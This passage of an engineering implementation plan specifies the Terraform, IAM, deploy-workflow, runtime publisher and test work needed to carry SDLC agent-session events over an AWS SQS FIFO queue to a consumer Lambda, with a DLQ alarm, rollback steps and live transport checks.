- `npm run test:backend` passes.
- `grep -c "Promise.all" backend/lambda_handlers/sdlcEventConsumer/index.js` returns `0`.

**Commit:** `feat: add the SDLC event consumer Lambda`

### Task 3.6 — the FIFO queue, DLQ, alarm, consumer Lambda and event source mapping

**Files:**
- `infrastructure/sdlc-events.tf` (NEW — a coherent unit of seven resources; do not scatter them into `lambdas.tf`, which is already 2 900+ lines)
- `.github/workflows/deploy-dev.yml` (MOD — see Task 3.8)

**This will be the repo's first FIFO queue.** Verified: `grep -rn "fifo" infrastructure/*.tf` returns **nothing**, and there are **16** `aws_sqs_queue` resources (`application-provisioning.tf` 2, `devops-agent-autonomous.tf` 3, `devops-monitoring.tf` 8, `devops-diagnosis.tf` 2, `main.tf` 1) — all standard.

**Copy `infrastructure/devops-diagnosis.tf:10-28` for the queue pair and `:119-124` for the event source mapping.** That file is the cleanest example in the repo — long polling, a DLQ, `maxReceiveCount = 3`, and **`function_response_types = ["ReportBatchItemFailures"]` already set** (`:123`), so partial-batch reporting is established practice here and not something to invent. **Do not copy `aws_sqs_queue.bedrock_queue` (`main.tf:435-447`)** — it has **no DLQ at all** and `receive_wait_time_seconds = 0`, and it should not be anyone's template.

Resources:

```hcl
resource "aws_sqs_queue" "sdlc_events" {
  name                        = "${var.project_name}-sdlc-events-${var.environment}.fifo"
  fifo_queue                  = true
  content_based_deduplication = false   # we supply explicit MessageDeduplicationId
  visibility_timeout_seconds  = 180     # >= the consumer's timeout — see below
  message_retention_seconds   = 86400
  receive_wait_time_seconds   = 20

  redrive_policy = jsonencode({
    deadLetterTargetArn = aws_sqs_queue.sdlc_events_dlq.arn
    maxReceiveCount     = 3
  })

  tags = { Component = "sdlc-events" }
}

resource "aws_sqs_queue" "sdlc_events_dlq" {
  name                      = "${var.project_name}-sdlc-events-dlq-${var.environment}.fifo"
  fifo_queue                = true
  message_retention_seconds = 1209600   # 14 days
  tags                      = { Component = "sdlc-events" }
}
```

Three FIFO-specific facts, each of which will bite if missed:

- **The name must end `.fifo`, and so must the DLQ's.** A standard DLQ on a FIFO queue is rejected at apply.
- **`content_based_deduplication` must be `false`.** We supply explicit ids (Task 3.9). Leaving it on would dedup two genuinely different batches whose bodies happen to match — plausible for a repeated `progress` line — and **silently lose events**.
- **`deduplication_scope` / `fifo_throughput_limit`: leave at the defaults** (`queue` / `perQueue`). High-throughput mode would relax ordering to per-message-group, which sounds desirable but is not needed: FIFO's default 300 msg/s (3 000 batched) is far above anything 10 concurrent sessions produce under §A.4.4's coalescing. Do not turn on a feature to solve a problem you do not have.

**The visibility/retry budget is a designed number, not a copied one.** `maxReceiveCount = 3` × `visibility_timeout_seconds = 180` ≈ **9 minutes** of frozen message group before a poison message reaches the DLQ, against a 20-minute stall threshold (`cycleStatuses.js:144`). It fits, and **the margin is the design.** A comment in the `.tf` must say so, naming both numbers and the threshold, because the next person to tune a timeout will not otherwise know they are spending stall budget.

**The DLQ alarm — a poison event must page, not sit.** Copy `aws_cloudwatch_metric_alarm.provisioning_dlq_depth` (`infrastructure/application-provisioning.tf:314-338`) exactly: `ApproximateNumberOfMessagesVisible`, `GreaterThanThreshold`, `threshold = 0`, `period = 300`, `statistic = "Maximum"`, `evaluation_periods = 1`, `treat_missing_data = "notBreaching"`, and **both** `alarm_actions` and `ok_actions` set to `aws_sns_topic.devops_audit_alerts.arn`. The `ok_actions` half matters: without it, a drained DLQ leaves the alarm in ALARM and the next poison message pages nobody.

**The consumer Lambda.** Copy `aws_lambda_function.devops_diagnosis_engine` (`devops-diagnosis.tf:89-115`) for the shape:

- `handler = "index.handler"`, `runtime` matching the repo's Node runtime
- `timeout = 180` — **the same number as `visibility_timeout_seconds`**, and the comment must cross-reference it
- `memory_size = 512` (it does DynamoDB writes and one optional HTTPS call; 2048 would be cargo-culted from the Bedrock engine)
- **`layers = [aws_lambda_layer_version.common_layer.arn]`** — required, because the handler `require`s `common/sdlcContract`, `common/cycleEffects`, `common/runtimeClient`, `common/progressLogger` and `common/dynamoHelpers` from the shared layer (§0.2)
- `filename` + `source_code_hash` from `${path.module}/sdlcEventConsumer.zip`
- `role = aws_iam_role.lambda_execution_role.arn` — reuse the shared role; the consumer needs the same DynamoDB access every other handler has
- `depends_on = [aws_cloudwatch_log_group.sdlc_event_consumer_logs]`
- env: `DYNAMODB_TABLE_NAME`, `SDLC_RUNTIME_API_BASE` (**no port suffix and no `/v1/sdlc` suffix** — revision 6; the `:8443` an earlier draft required would dial a listener that does not exist), `SDLC_AUTH_TOKEN_ARN`, and the QA agent ARN if `routeAfterEngineering`'s `ai-qa` branch invokes it. **No Cognito M2M vars** — §0.9.1 removed them. The certificate ARNs (`SDLC_CLIENT_CERT_ARN`, `SDLC_CLIENT_KEY_ARN`, `SDLC_RUNTIME_CA_ARN`) are wired but empty in token mode
- **`reserved_concurrent_executions`**: leave unset. Ordering is enforced by `messageGroupId`, not by concurrency, and throttling the consumer would extend the group-freeze window that §A.4.5's budget depends on.

A log group at 90-day retention (copy `devops-diagnosis.tf:59-62`).

**The event source mapping:**

```hcl
resource "aws_lambda_event_source_mapping" "sdlc_event_consumer" {
  event_source_arn        = aws_sqs_queue.sdlc_events.arn
  function_name           = aws_lambda_function.sdlc_event_consumer.arn
  batch_size              = 10
  function_response_types = ["ReportBatchItemFailures"]
  enabled                 = true
}
```

`batch_size = 10` rather than the `1` used at `devops-diagnosis.tf:122` and `lambdas.tf:1564`: those consumers do minutes of Bedrock work per message, this one does a handful of DynamoDB writes, and batching is most of the point of §A.4.4's coalescing. **`function_response_types` is mandatory** — without it a single bad record re-delivers the whole batch, so unrelated sessions' events replay.

**No `aws_sqs_queue_policy` is needed.** The publisher is the runtime's EC2 instance role, which lives in the **same account** as the queue — `provider = aws.sherpa_runtime` assumes `CommandCenterSherpaProvisionerRole` within account `946774551778`, not a different account (`sherpa-ec2.tf:12-17`). An identity-based grant (Task 3.7) is sufficient. Contrast `aws_sqs_queue_policy.devops_diagnosis_allow_eventbridge` (`devops-diagnosis.tf:32-50`), which exists only because the publisher there is the EventBridge **service** principal. Adding a resource policy here would be cargo-culting.

**The consumer also needs `sqs:ReceiveMessage`/`DeleteMessage`/`GetQueueAttributes` on the new queue.** Add the queue ARN to the existing list in `aws_iam_role_policy.lambda_policy` at **`infrastructure/lambdas.tf:70-73`** (currently `bedrock_queue` and `application_provisioning_queue`). **That policy is already in the Core `-target=` list at `deploy-dev.yml:428`, so editing it deploys with no new target entry** — the same happy accident as Phase 1 Task 1.7's IAM edit.

**Tests first:** none. **Not TDD — verified by `terraform plan` and the live checks below.** Do not write a test that greps the `.tf` file; the plan is the check and a grep test would pass on a resource that cannot apply.

**Acceptance:**
```
cd infrastructure && terraform plan \
  -target=aws_sqs_queue.sdlc_events -target=aws_sqs_queue.sdlc_events_dlq \
  -target=aws_cloudwatch_metric_alarm.sdlc_events_dlq_depth \
  -target=aws_cloudwatch_log_group.sdlc_event_consumer_logs \
  -target=aws_lambda_function.sdlc_event_consumer \
  -target=aws_lambda_event_source_mapping.sdlc_event_consumer \
  -target=aws_iam_role_policy.lambda_policy
```
Expected: `6 to add, 1 to change`.

After apply:
```
aws sqs get-queue-attributes --profile testing-tooling --region us-east-1 \
  --queue-url $(aws sqs get-queue-url --profile testing-tooling --region us-east-1 \
    --queue-name command-center-sdlc-events-testing.fifo --query QueueUrl --output text) \
  --attribute-names FifoQueue ContentBasedDeduplication VisibilityTimeout RedrivePolicy ReceiveMessageWaitTimeSeconds
```
Expected: `FifoQueue: "true"`, `ContentBasedDeduplication: "false"`, `VisibilityTimeout: "180"`, `ReceiveMessageWaitTimeSeconds: "20"`, and a `RedrivePolicy` naming the DLQ with `maxReceiveCount: 3`. **Check `ContentBasedDeduplication` explicitly** — it is the one that silently loses events if wrong.

```
aws lambda get-event-source-mapping --profile testing-tooling --region us-east-1 \
  --uuid <uuid from list-event-source-mappings> \
  --query '{State:State,Batch:BatchSize,Resp:FunctionResponseTypes}'
```
Expected: `State: "Enabled"`, `Batch: 10`, `Resp: ["ReportBatchItemFailures"]`.

**Rollback.** All seven resources are new and nothing publishes to the queue until Task 3.9 is deployed, so `terraform destroy` on the targets is clean **provided it happens before the publisher ships**. After that, destroying the queue makes the runtime's `SendMessage` fail and every cycle stalls — caught only by the 20-minute stall detector (architecture doc R3). **If you need to stop the consumer after go-live, disable the event source mapping (`enabled = false`) rather than deleting the queue**: messages accumulate for 24 hours and drain when you re-enable, whereas a deleted queue loses them.

**Commit:** `feat: add the SDLC event FIFO queue, DLQ and consumer wiring`

### Task 3.7 — grant the runtime `sqs:SendMessage` and give it the queue URL

**Files:**
- `infrastructure/sherpa-ec2.tf` (MOD — one IAM statement, one `templatefile` variable)
- `infrastructure/sherpa-ec2-cloud-init.sh.tftpl` (MOD — one `Environment=` line)

**`sherpa-ec2.tf` has no `sqs` reference at all today** — verified. Add one statement to the existing `aws_iam_role_policy.sherpa_runtime_app` (`sherpa-ec2.tf:174-241`), following the `Sid`-per-statement style the other five use:

```hcl
{
  Sid    = "SdlcEventPublish"
  Effect = "Allow"
  Action = ["sqs:SendMessage", "sqs:GetQueueUrl"]
  Resource = [aws_sqs_queue.sdlc_events.arn]
},
```

**This creates a new cross-provider dependency and it is worth naming.** `aws_iam_role_policy.sherpa_runtime_app` is created through `provider = aws.sherpa_runtime` (`:176`); `aws_sqs_queue.sdlc_events` is created by the default provider. The reference works — same state, same account, one apply — but it means **`sherpa-ec2.tf` now depends on a queue Command Center owns**, so the runtime's IAM changes when the queue does. Note it in a comment.

**The queue URL reaches the runtime through cloud-init, and this is the fiddly part.** Two coordinated edits, and **missing either one fails the apply or silently does nothing:**

1. Add `sdlc_events_queue_url = aws_sqs_queue.sdlc_events.url` to the `templatefile()` variable map in `local.sherpa_runtime_user_data` at **`sherpa-ec2.tf:348-358`** (currently nine variables: `artifact_bucket`, `kb_bucket`, `session_bucket`, `session_prefix`, `aws_region`, `model_id`, `github_app_id`, `github_app_private_key_arn`, `github_app_installation_id`). **A `${…}` in the template with no matching map entry fails `terraform plan`** with an unset-variable error — which is the good failure mode. The bad one is the reverse: a map entry with no template reference applies cleanly and does nothing.
2. Add `Environment=SDLC_EVENTS_QUEUE_URL=${sdlc_events_queue_url}` to the systemd unit's `Environment` block in `sherpa-ec2-cloud-init.sh.tftpl` (the block the architecture doc cites as `:144-157`; **find it by content, not line number**).

**⚠ This will not take effect on the running instance.** `sherpa-ec2.tf:375` sets `user_data_replace_on_change = false` and `:397-402` carries `lifecycle { ignore_changes = [ami] }`. **A cloud-init template change does not replace the instance and does not re-run on it** — the same trap as Phase 0 Task 0.7. So this task has two halves:

1. The Terraform change, so every future instance gets the variable.
2. **A manual application to `i-0d5271e1ce5ea4fb0`**: either edit the systemd drop-in over SSM and `systemctl daemon-reload && systemctl restart sherpa-runtime`, or replace the instance deliberately. **A restart kills every live session** — `SIGTERM` does not drain agent sessions (`apps/runtime/src/index.ts:131-137`) and the concurrency queue is in-memory (§0.1.b C21) — so run the all-zeros `/health` pre-flight from `nevado-sherpa-tui/docs/AWS_DEPLOYMENT.md:553-576` first. Batch this with Task 3.9's runtime deploy; they need the same outage window and the publisher is useless without the variable anyway.

**The IAM half, by contrast, is live immediately** and is worth applying first and separately: a role that can publish to a queue nothing writes to is harmless, and having it in place removes one variable from Task 3.9's debugging.

**Tests first:** none. **Not TDD — verified by:**

```
aws iam get-role-policy --profile testing-tooling --region us-east-1 \
  --role-name <sherpa runtime instance role name> --policy-name sherpa-runtime-app \
  --query 'PolicyDocument.Statement[?Sid==`SdlcEventPublish`]'
```
Expected: one statement with `sqs:SendMessage` and the new queue's ARN.

Then, from the instance over SSM — **the test that actually matters**, because it proves the grant and the URL together:

```
aws ssm send-command --profile testing-tooling --region us-east-1 \
  --instance-ids i-0d5271e1ce5ea4fb0 \
  --document-name AWS-RunShellScript \
  --parameters 'commands=["systemctl show sherpa-runtime -p Environment | tr \" \" \"\\n\" | grep SDLC_EVENTS_QUEUE_URL","aws sqs get-queue-attributes --queue-url \"$SDLC_EVENTS_QUEUE_URL\" --attribute-names QueueArn --region us-east-1"]'
```
Expected: the env var present on the unit, and the `get-queue-attributes` call succeeding from the instance role. **An `AccessDenied` here means the IAM statement did not reach the role; a blank env var means the cloud-init half did not reach the instance.** The two failure modes are distinguishable, which is why both commands are in one call.

**⚠ If you extend this probe to touch git or `gh`, prefix with `sudo -u ec2-user HOME=/home/ec2-user`.** SSM runs as `root` with `HOME=/root`, and the credential helper is at the XDG path `/home/ec2-user/.config/git/config` (`sherpa-ec2-cloud-init.sh.tftpl:63-68`), so without it git silently finds no helper and the symptom is indistinguishable from an auth failure. §0.2's runtime-conventions table has the full note. The two AWS CLI commands above are unaffected — they use the instance role, not a git credential.

**Rollback:** remove the statement and the env var. The publisher fails closed — it cannot send, which stalls cycles rather than corrupting anything. `SendMessage` failure is architecture doc **R3**, the one remaining stall case, and it surfaces on the first cycle rather than intermittently.

**Commit:** `feat: grant the sherpa runtime publish access to the SDLC event queue`

### Task 3.8 — add every new resource to the deploy target list

**Files:** `.github/workflows/deploy-dev.yml` (MOD).

Per §0.3 and the project rule. **Same PR as the resources** — split across Tasks 3.6 and 3.7's PRs rather than deferred to one sweep, because a deferred sweep is how an entry gets missed.

**Insert into the Core target list, immediately before line 587** (the first `-var=` line of the "Terraform Apply: Core" step, which begins at `:419` with its target range `:427-586`):

```yaml
            -target="aws_sqs_queue.sdlc_events" \
            -target="aws_sqs_queue.sdlc_events_dlq" \
            -target="aws_cloudwatch_metric_alarm.sdlc_events_dlq_depth" \
            -target="aws_cloudwatch_log_group.sdlc_event_consumer_logs" \
            -target="aws_lambda_function.sdlc_event_consumer" \
            -target="aws_lambda_event_source_mapping.sdlc_event_consumer" \
```

**Six entries, not eight.** Two deliberate omissions, both of which a reviewer applying the rule mechanically will query — put the reasons in the PR description:

- **`aws_iam_role_policy.lambda_policy` is already targeted at `:428`.** The consumer's `sqs:ReceiveMessage` grant rides that existing entry. Adding a duplicate is harmless but noisy; verify with `grep -n 'aws_iam_role_policy.lambda_policy' .github/workflows/deploy-dev.yml` rather than assuming.
- **Task 3.7's resources must NOT be added.** `aws_iam_role_policy.sherpa_runtime_app` and `aws_instance.sherpa_runtime` are gated on `var.enable_sherpa_runtime`, which internal never sets, so their `count` is **0** — and **a `-target` for a zero-count resource fails the apply.** The Sherpa EC2 runtime does not exist in internal/dev at all (verified: zero matches in `deploy-dev.yml` for `aws_instance.sherpa_runtime`, `sherpa_alb`, `sherpa_kb` or `enable_sherpa_runtime`; the only "sherpa" targets there, `:561-581`, are the **Lambda**-based Sherpa from `sherpa.tf`). Those resources reach testing through the full untargeted apply in `deploy-customer-instance.yml`.

**Also register the new handler for packaging.** `scripts/deployment/package-lambdas.sh` requires one explicit line per handler; add it beside the others at `:444-468`:

```sh
maybe_package "sdlcEventConsumer" "backend/lambda_handlers/sdlcEventConsumer"
```

The zip name must match the `filename` in Task 3.6 (`${path.module}/sdlcEventConsumer.zip`). **Without this line the Lambda's `filename` points at a zip that is never built**, and `filebase64sha256` fails the plan — a loud failure, fortunately.

**Tests first:** none. **Not TDD — verified by:**
```
grep -c 'target=' .github/workflows/deploy-dev.yml
```
Expected: **434** (428 after Phase 1 Task 1.5, plus 6).
```
awk 'NR>=427 && NR<=592' .github/workflows/deploy-dev.yml | grep -c 'sdlc_event'
```
Expected: `5` (the four `sdlc_event*` resources plus the mapping; the two queues match `sdlc_events`). Adjust the grep to whatever unambiguously counts all six — **the point is to confirm every entry is inside the Core range and before the first `-var=`**, because an entry that lands in the DevOps Phase 2-4 list at `:830-956` applies in the wrong phase and may fail on a dependency that does not exist yet.
```
grep -n 'sdlcEventConsumer' scripts/deployment/package-lambdas.sh
```
Expected: one hit.

**Acceptance:** the next `deploy-dev` run's "Terraform Apply: Core" step logs all six resources as created or as no-ops. **A green run that does not mention them means they were not targeted** — re-check the insertion point.

**Rollback:** revert the lines. The resources stay in state and simply stop being reconciled on internal, which is the status quo.

**Commit:** `chore: add SDLC event transport resources to the deploy target list`

### Task 3.9 — the runtime publisher

**Files (all in `nevado-sherpa-tui`):**
- `apps/runtime/src/config.ts` (MOD — `sdlcEventsQueueUrl`)
- `apps/runtime/src/config.test.ts` (MOD)
- `apps/runtime/src/sdlc/publisher.ts` (NEW)
- `apps/runtime/src/sdlc/publisher.test.ts` (NEW)
- `apps/runtime/src/ws/broadcaster.ts` (MOD — **add `setObserver`**, one method)
- `apps/runtime/src/sdlc/sqs-transport.ts` (NEW — the three-line AWS adapter)
- `apps/runtime/package.json` (MOD — `@aws-sdk/client-sqs`)

**This is the largest runtime-side task in Part 1.** Three independent pieces — the event filter, the two-tier cadence, and the publish call. ~~and the seq counter~~ — **deleted; there is no counter and no `seq` field** (§A.4.1, BQ2).

**The good news: there is a single chokepoint.** `Broadcaster.send(sessionId, message)` (`apps/runtime/src/ws/broadcaster.ts:39`) is where **every** `ServerMessage` for a session passes — the agent runner's `emit` is wired to it at `apps/runtime/src/agent/worker.ts:216`. So the publisher is a genuine one-line hook, not a scatter. **Add the hook there and nowhere else**, or the filter in §A.4.2 becomes unverifiable.

**The hook is `Broadcaster.setObserver(observer)`, installed once at boot** (Task 1.6's registration block), and its shape is worth getting right in three ways the shipped version had to learn:

- **One observer, last-wins, not a list.** A second `setObserver` replaces the first rather than appending. There is exactly one consumer of this seam and a list invites a second that is never audited.
- **The observer's exceptions are CAUGHT and must not reach `send`.** A publisher that throws must never take down the human WebSocket broadcast it is observing. Log and continue.
- **Two facts the transport depends on**, both mandatory on this queue: `MessageGroupId = sessionId`, and `MessageDeduplicationId` passed **explicitly** — content-based deduplication is switched **OFF** deliberately, so an omitted id is a hard `InvalidParameterValue` from SQS rather than a silently-derived fallback. Keep the AWS call in its own module so `publisher.ts` — which holds the wire format, the mapping and the ordering guarantee — has **no AWS dependency and can be driven entirely in-process.**

**(a) The event filter.** Publish only the seven types in §A.4.2. Everything else — `connected`, `pong`, `streamStart`, `streamDelta`, `streamEnd`, `toolRejected`, `approvalRequired`, `questionRequired`, `sessionSync`, `modeSwitch`, `taskTrackerUpdate`, `subAgentStart`, `subAgentEnd`, `subAgentToolStart`, `subAgentToolEnd`, `tokenUsage`, `catchUp` — is dropped. **`streamDelta` alone is the majority of the human stream's frames and has no cycle effect**; that filter is the entire reason for a separate publication path.

**Publish only for SDLC sessions.** The discriminator is `application === 'sdlc'` on the persisted `AgentSession` (§A.7.1). A human session must produce zero SQS traffic — and that needs a test, because the failure is a bill and a polluted queue rather than an error.

**(b) The dedup id — a per-envelope UUID. There is no counter and nothing is persisted.** BQ2 is resolved:

```js
const dedupId = crypto.randomUUID();   // minted once, when the envelope is constructed
```

and `MessageDeduplicationId = dedupId`, **reused across retries of that one `SendMessage`** and nowhere else. That is the entire requirement: dedup needs retry-stability, not monotonicity — ordering is `messageGroupId`'s job and the consumer never reorders (§A.4).

**Do not persist anything for this.** An earlier draft specified a durable `publishSeq` on the session record. Two reasons that was wrong, and both are worth knowing because someone will propose it again:

- **Its failure mode was silent and catastrophic.** A restart that lost the counter republished a used id, and SQS **drops a duplicate id with no error anywhere** — events vanish. A UUID does the opposite: a restart mints a fresh id, the message is delivered, and the consumer (idempotent since Task 3.4) absorbs it. **A harmless duplicate beats a silent drop.**
- **It would have put a process-global lock on the publish hot path.** `FileSessionStore` serialises **whole-file** read-modify-write of `sessions.json` through a **single fixed mutex key** — *"One fixed key — the file is the resource"* (`file-session-store.ts:19-32`). Persisting a counter per published message means rewriting the entire session list, under that lock, on every event, for every concurrent session.

**`seq` is not in the envelope at all (revision 6).** An earlier draft kept it as an in-memory, non-durable counter for log readability, with the caveat *"if retaining it tempts anyone to depend on it, drop it"*. **It was dropped**, and the consumer's `Envelope` struct has no field for it. **Write the `dedupId` into the body instead** — SQS does not echo the `MessageDeduplicationId` parameter back, so that is what lets an operator tie a DLQ message to the send that produced it, and it is the only log-correlation field needed.

**(c) The two-tier cadence** (§A.4.4). Tier 1 — `sessionStatus` (`'active'`, and `'paused'` with a `reason`), `error`, `completion`, `planCreated` — publishes immediately. Tier 2 — `toolStart`, `toolEnd`, `progress` — buffers on a ~10 s window and publishes one envelope carrying an `events[]` array.

Three rules that are contract, not preference:

- **Publish nothing when the window is empty.** An idle session must not emit heartbeat traffic. This deliberately starves `cycle.updatedAt`, which is why Part 2's stall handling asks the session rather than trusting the clock.
- **Flush unconditionally on any Tier 1 event**, so a `completion` never arrives before the activity that preceded it. Same `messageGroupId`, so FIFO guarantees the flush lands first.
- **Flush on session end.** A session that completes with 4 seconds of buffered activity must not lose it. The `finally` in `startSession` (`worker.ts:231`) is the seam.

**(d) ~~Two protocol additions ride this task~~ — NEITHER does (revision 6). No SDK change, and the failure edge is published differently.**

The two were `reason?: PauseReason` on the `sessionStatus` frame (P4/P5) and `'queued'` on `SessionStatus` (P2). What replaced them:

- **`'queued'` needed nothing.** It is a **create-response** field only, describing admission rather than session state, so no persisted union is widened and **the three-repo exhaustiveness audit does not arise.** (The audit's reasoning is still correct for any future widening — a widened union with a non-exhaustive consumer is a silent fallthrough, exactly the `mapStatusToStageIndex` failure class at `CycleProgress.jsx:29-31`.)
- **The pause reason is published as its own `sessionEnd` event, bypassing the broadcaster** — because 4.0.1's `sessionStatus` variant has no field that could carry it and adding one is an SDK release. **This is the event that gives the SDLC path a failure edge at all**, and it exists because of a fact worth stating plainly: the deployed engine has **ten** `finish(session, 'paused', …)` sites and **zero** `finish(session, 'completed', …)`, so *every* exit — a healthy `end_turn` included — persists `paused`, and `sessionStatus` alone cannot tell a session that delivered from one that died. **The reason IS known in this repo** — `AgentRunner.runTurn` returns it as `pauseReason` — it was simply never forwarded.
- **`SESSION_END_REASONS` is a restatement, not a re-export**, so the wire vocabulary is readable without opening the SDK — and it is pinned **both ways** by the driftguard: as data, and against the reasons the deployed engine can actually produce. **Widening it is a Command Center deploy, not a runtime one**, because the consumer maps a reason to a per-stage failure status and a value it has no arm for is a cycle that goes quiet again — the exact defect this event exists to fix.
- **Two values need naming.** `aborted` is **not a failure** — it is Command Center's own cancel arriving back as an observation, and a consumer that maps it to a failed stage marks every cancelled cycle broken. `turn_failed` is **this runtime's value, not the SDK's**, for the case the SDK cannot report: `runTurn` threw, so there is no return value to read a reason off. And note `sso-expired` carries a **hyphen** where its siblings use an underscore — that is the SDK's own spelling, **passed through unaltered rather than normalised**, because a value this repo rewrites is a value the next SDK bump can silently desynchronise.

**Tests first.** `node:test` over compiled `dist/` — **`pnpm build` first or the test runs nothing and still exits 0** (§0.2). Mock the SQS client; do not hit AWS. Reuse `apps/runtime/src/routes/test-fixtures.ts`.

`apps/runtime/src/sdlc/publisher.test.ts`:

| Test name (sentence) | Setup | Assertion |
|---|---|---|
| `it('publishes nothing for a human session')` | `application: 'web'`, a full mix of events | `SendMessage` never called. **The bill-and-pollution test** |
| `it('publishes nothing when the coalescing window is empty')` | SDLC session, advance the clock 30 s with no events | `SendMessage` never called |
| `it('coalesces tool events in one window into a single message')` | three `toolStart` + two `toolEnd` inside 10 s, then flush | **one** `SendMessage`; its `events[]` has five entries in emission order |
| `it('mints one dedupId per message, not one per event')` | as above | one `SendMessage`, one `MessageDeduplicationId`; a second window produces a **different** one. §A.4.1: numbering events inside a batch would give two messages the same id whenever a flush boundary moved |
| `it('reuses the same dedupId when SendMessage is retried')` | SQS client double that throws once then succeeds | two `SendMessage` attempts, **identical `MessageDeduplicationId`**. This is the only property dedup actually requires, and it is the only one worth testing |
| `it('publishes a Tier 1 event immediately')` | one `error` | `SendMessage` called before the window elapses |
| `it('flushes buffered activity before a Tier 1 event, so completion never overtakes it')` | two `toolStart`, then a `completion`, all inside one window | two `SendMessage` calls, and the activity envelope is sent **first**. Assert call order on the SQS double, not on any field — there is no monotonic field to assert on any more, and ordering on the wire is what `messageGroupId` then preserves |
| `it('flushes buffered activity when the session ends')` | one `toolStart`, then session end 4 s later | the activity was published |
| `it('sets messageGroupId to the sessionId so SQS owns per-session ordering')` | any | `MessageGroupId === session.id` |
| `it('keeps two concurrent sessions in separate message groups')` | events from two sessions interleaved | two distinct `MessageGroupId`s; each envelope's `events[]` contains only its own session's events |
| `it('drops every event outside the SDLC set')` | one of each of the 17 never-publish types | `SendMessage` never called. **Enumerate all 17** — a `toContain`-style spot check is what lets `streamDelta` back in |
| `it('echoes the correlation verbatim without reading it')` | correlation with an extra unknown key | the published envelope's `correlation` deep-equals the stored one **including the unknown key**. The boundary assertion: the runtime is a courier |
| `it('stamps v as 1 and publishedAt as an ISO timestamp')` | any | `v === 1`; `publishedAt` parses and ends in `Z` |
| `it('never publishes an empty events array')` | force a flush with an empty buffer | no call |
| `it('writes nothing to the session store in order to publish')` | a store double that records every call | **zero** store writes across ten published envelopes. Guards against the durable-counter design being reintroduced, and against its lock-contention cost (BQ2) |
| `it('mints a fresh dedupId after a restart rather than reusing one')` | publish 3 messages, rebuild the publisher from scratch, publish again | the fourth `MessageDeduplicationId` is not equal to any of the first three. **A restart producing a duplicate would be acceptable; a restart producing a *reused id* would be silent loss** — this asserts the safe direction |
| `it('surfaces a SendMessage failure without killing the session')` | SQS throws | the agent turn continues; the failure is logged. Architecture doc R3: a publish failure stalls the cycle and is caught by the 20-minute detector — it must not also crash the session |

`apps/runtime/src/config.test.ts` — one case per §0.2's rule that every new env var gets one:

| Test name (sentence) | Assertion |
|---|---|
| `it('reads SDLC_EVENTS_QUEUE_URL from the environment')` | present ⇒ `config.sdlcEventsQueueUrl` set; absent ⇒ `undefined`, and the publisher is inert rather than throwing at boot. **A runtime that will not start because an optional queue is unconfigured is a worse failure than one that does not publish** |

**Acceptance:**
```
cd <your nevado-sherpa-tui checkout> && pnpm build && pnpm --filter @nevado/runtime test
```
Expected: all suites pass, including `publisher.test.ts`.

**Deploy:** ~~publish/bump the SDK for (d), then~~ **no SDK step (revision 6 — see (d))**; just the manual SSM RunCommand (`nevado-sherpa-tui/docs/AWS_DEPLOYMENT.md:578-610`) with the **all-zeros `/health` pre-flight** (`:553-576`). **Batch this with Task 3.7's manual systemd edit** — same outage window, and the publisher is inert without the queue URL.

**Rollback:** re-deploy a pinned SHA (`:664-681`). The publisher is additive and gated on `application === 'sdlc'`, so a rollback cannot affect human sessions. **If the publisher misbehaves after go-live, unsetting `SDLC_EVENTS_QUEUE_URL` and restarting is the faster kill switch** than a redeploy — it makes the publisher inert while leaving everything else running.

**Commit (in `nevado-sherpa-tui`):** `feat: publish SDLC session events to the FIFO queue`

### Task 3.10 — delete the polling scaffolding and prove the transport

**Files:**
- `scripts/testing/sdlc-session-smoke.js` (MOD — drop the polling loop)
- `scripts/testing/sdlc-transport-verify.js` (NEW)

**Not TDD.** These are integration proofs against live infrastructure; the unit-testable parts are already covered by Tasks 3.1–3.5 and 3.9.

Phase 2's smoke script polls `GET /sessions/{id}` every 10 s. **That was deliberate throwaway scaffolding** — it proved the execution loop before the transport existed. Delete the loop; the script now creates a session and exits, and the cycle record is what you watch.

`scripts/testing/sdlc-transport-verify.js` drives the four exit criteria. Each is a function so they can be run individually while debugging:

1. **The coalescing works — measured on the transport, not on the cycle record.** Start a session against a throwaway repo with a task that makes several tool calls.

   **An earlier draft asserted that consecutive `progressLog` entries' timestamps are ~10 s apart and "not sub-second". That assertion fails on correct behaviour and passes on broken behaviour, so it is deleted.** One coalesced Tier-2 envelope carrying eight tool events produces **eight** `addProgressLog` calls inside one consumer invocation, milliseconds apart — and a Tier-1 flush deliberately lands buffered activity immediately before a terminal event. Per-tool-call messages, by contrast, would produce evenly-spaced entries. The record's timestamps measure the consumer's loop speed, not the publisher's cadence.

   **Assert on the transport instead.** Any one of these is sufficient; do at least the first two:
   - The queue's `NumberOfMessagesSent` CloudWatch metric over the session's lifetime is **far below** the number of tool events the session ran. Count the tool events from `progressLog`; the ratio is the coalescing factor and it should be roughly an order of magnitude.
   - The count of **distinct `publishedAt` values** across the session's envelopes (readable from the consumer's log lines, which should log it) is far below the tool-event count.
   - The consumer's Lambda invocation count for the session is likewise far below it.

   And assert the one record-level property that *is* meaningful: **the feed is non-empty and in chronological order** — which is also the end-to-end check on Task 0.5's `selectActivities`.

2. **A poisoned message freezes only its own group, reaches the DLQ in ~9 minutes, fires the alarm, and the group then drains in order with nothing lost.** Inject a message with `v: 2` (the `ENVELOPE_UNKNOWN_V` shape) directly with `aws sqs send-message` using a real `MessageGroupId` for a live session, followed by three good ones in the same group. Assert: the three good ones do **not** apply while the poison is retrying; `ApproximateNumberOfMessagesVisible` on the DLQ goes to 1 within ~9 minutes; the alarm transitions to ALARM; then all three good messages apply **in order**. **Measure the wall-clock to the DLQ and write it down** — §A.4.5's budget is 9 minutes against a 20-minute stall threshold, and this is the only measurement of it.

3. **Two concurrent sessions do not cross-contaminate.** Start two sessions on two cycles. Assert each cycle's `progressLog` contains only its own session's activity, and that neither cycle's status was written by the other's events.

4. **A replayed terminal message does not double-open a PR and does not move the cycle backwards.** Redrive the completion message from the DLQ **after** the five-minute dedup window has expired — that is the case dedup does not cover, and testing inside the window proves nothing. Assert `cycle.pullRequest.number` is unchanged (the `!cycle.pullRequest?.number` guard at `index.js:1858`) and `cycle.status` did not regress (Task 3.4's conditional write).

**The old criterion 5 — "restarting the runtime mid-session does not reuse a `seq`" — is deleted**, along with the durable counter it tested (BQ2). Under a per-envelope UUID a restart produces a *new* id, so the failure it guarded against cannot occur. The residual property worth a unit test rather than a live one is Task 3.9's `it('mints a fresh dedupId after a restart rather than reusing one')`.

**Use a throwaway repo and say which one in the script header.** The GitHub App installation covers real customer repositories and any session on the runtime can push to any of them (§A.7.4).

**Acceptance:** `node scripts/testing/sdlc-transport-verify.js` exits 0, printing a pass line per criterion and the measured DLQ latency for criterion 2.

